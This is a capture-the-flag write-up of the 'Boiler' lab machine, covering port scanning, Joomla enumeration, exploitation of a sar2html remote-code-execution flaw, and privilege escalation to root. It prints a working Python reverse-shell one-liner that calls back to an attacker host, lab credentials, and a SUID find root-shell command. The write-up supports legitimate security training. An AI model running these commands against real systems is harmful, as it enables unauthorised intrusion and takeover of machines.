Boiler CTF (Rewritten)

Target IP: 10.10.185.139
Challenge Description:

Reconnaissance


Performing a TCP port scan using the command sudo nmap -sS 10.10.185.139 -p- returns the result shown above. There are four TCP ports open on the target machine. They are FTP on port 21, HTTP on port 80, and two other applications on ports 10000 and 55007. Time to perform an aggressive scan to identify what applications are running on these ports.


I performed an aggressive scan using the command sudo nmap -sV -A 10.10.185.139 -p 21,80,10000,55007 and obtained the result shown above. The FTP allows anonymous login, the ports 80 and 10000 are running HTTP, and SSH is available on port 55007. Since FTP allows anonymous login, I will begin my enumeration there.

Enumeration

Port 21: FTP

I connected to the FTP on port 21 using the command ftp 10.10.185.139. Afterwards, I entered anonymous as the user. No password is requried. Then running ls -la shows there is a text file with the name .info.txt. I downloaded this file on my machine using the command get .info.txt. Running the command cat .info.txt to check the content contains the ciphertext Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!.


I decoded the ciphertext and obtained the plaintext shown above. This is not useful. Time to enumerate harder.

Port 10000: HTTPs (Webmin)

I notice this application is running on HTTPs. After accepting the certificate and risks, the webpage above was returned to me. The web application is Webmin. Since I do not have any credentials, I can test the default credentials which is root:root. However, this did not work either. Time to enumerate the HTTP application on port 80 now.

Port 80: HTTP

The Apache default webpage is returned to me for this application. I viewed the source-code of the webpage but I did not find anything important. I browsed to the /robots.txt and viewed the entries, but they were not useful either. Time to perform a directory search.


I performed a directory search using the command gobuster dir -u http://10.10.185.139/ -w /usr/share/wordlists/dirb/big.txt -x html,php,txt and obtained the result shown above. There is a Joomla CMS being hosted on this port. I can use droopescan to scan this Joomla CMS further; for example, what application version it is running, any interesting files, etc.


I downloaded droopescan on my machine. Using droopescan, I ran the command ./droopescan scan joomla --url http://10.10.185.139/joomla and obtained the result shown above. I performed a directory search against /joomla too using the command gobuster dir -u http://10.10.185.139/joomla/ -w /usr/share/wordlists/dirb/big.txt -x html,php,txt.


To check if the Joomla CMS is vulnerable, I need to find its application version first. To find the application version, I browsed to http://10.10.185.139/joomla/administrator/manifests/files/joomla.xml and obtained the information shown above. The target machine seems to be running Joomla 3.6. This application version has a few vulnerabilities. But I wish to enumerate further.


While waiting for the directory search to finish against /joomla, I checked the different entries from the scan above. Some of the entries are shown above. Most of the entries were rabbit-holes & useless, until I found a hit.


I browsed to http://10.10.185.139/joomla/_test and obtained the result shown above. The application sar2html seems to be running here. From previous experience, I know this sar2html 3.2.1 is vulnerable to Remote Code Execution (RCE). Time to put this application to test.

Exploitation

Owning the sar2html Application via Remote Code Execution (RCE)


On my machine, I made a copy of the sar2html 3.2.1 - 'plot' Remote Code Execution exploit via searchsploit by running the command searchsploit -m php/webapps/49344.py, as shown above.


I ran the exploit by running the command python3 49344.py. Then I entered the URL http://10.10.185.139/joomla/_test. Afterwards, I issued the commands whoami, id, and ifconfig and obtained the result shown above. Now I can perform RCE using this exploit. Time to obtain a reverse shell connection now by using this exploit.

Foothold: Reverse Shell Connection via Exploit Session

I started a listener on my machine at port 8443. Then I deployed the Python reverse shell code on the exploit session:

python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.14.87.142",8443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.14.87.142",8443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'

And immediately, I obtained a reverse shell connection from the target machine on my port 8443 with the session as www-data as shown above. In the picture above, the top terminal is where I deploy my reverse shell inside the exploit session, and the bottom terminal is where I obtain a reverse shell session. Now I have a foothold on the target machine. Time to elevate my privileges.

Privilege Escalation

Horizontal Privilege Escalation: www-data user to basterd user via Credential Hunting

After obtaining a session on the target machine, I ran the command ls -la to check the files in the current directory. And right away, I notice an unusual file with the name log.txt as shown above. Running cat log.txt to output the content inside this text file shows the juicy information shown in the picture above. This text file contains the credentials of the user basterd with their password superduperp@$$. This was logged for the SSH application.


I ran the command su basterd and the password superduperp@$$ to switch to this new user. And bingo. I successfully managed to switch & elevate my privileges horizontally to the user basterd from the user www-data. Since the SSH is available on port 55007, I SSHed into the target machine by using the command ssh baster@10.10.185.139 -p 55007 and the password superduperp@$$. Time to enumerate further.

Horizontal Privilege Escalation: basterd user to stoner user via Credential Hunting

Running the command sudo -l shows the current user cannot execute any commands with elevated privileges. When I browsed to the home directory of the user basterd at /home/basterd, I notice a script with the name backup.sh as shown above. Inside this script, the hardcoded credentials of the user stoner is available. This new credentials is stoner:superduperp@$$no1knows. Using the command su stoner and the password superduperp@$$no1knows, I managed to switch to the user stoner.

Vertical Privilege Escalation: stoner user to root user via SUID Privileges Abuse on /usr/bin/find

After some manual enumeration, I did not find anything useful. However, running the command find / -perm -u=s -type f 2>/dev/null shows the binary /usr/bin/find has SUID bit set. This means, I can execute /usr/bin/find with elevated privileges to spawn a root shell.


To spawn a root shell, I ran the command /usr/bin/find . -exec /bin/sh -p \; -quit as shown in the picture above. Now I have a root shell with root privileges on the target machine. GG.

Flags


The two flags are shown above. The .secret contains the user flag, and the root.txt contains the root flag.
